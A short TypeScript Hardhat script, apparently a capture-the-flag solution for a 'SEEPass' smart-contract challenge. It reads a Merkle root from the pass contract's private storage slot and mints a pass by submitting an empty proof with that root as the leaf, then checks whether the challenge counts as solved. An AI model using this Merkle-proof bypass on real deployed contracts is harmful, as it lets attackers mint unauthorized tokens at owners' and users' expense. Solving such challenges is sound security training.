import chalk from "chalk";
import { ethers } from "hardhat";
import { SetupMSSEETF23__factory, SetupMSSEETF23, SEEPassMSSEETF23__factory } from "../../typechain";
import { log, initialize } from "../utils";
import {randomBytes} from "crypto";

async function main() {
    let [setupMSSEETF23Contract, attacker] = await initialize<SetupMSSEETF23>(SetupMSSEETF23__factory, undefined, ["0x"+randomBytes(32).toString("hex")]);
    let seePass = SEEPassMSSEETF23__factory.connect(await setupMSSEETF23Contract.pass(), attacker);
    let root = await ethers.provider.getStorage(await seePass.getAddress(), 6);
    let tx = await seePass.mintSeePass([], root);
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await setupMSSEETF23Contract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});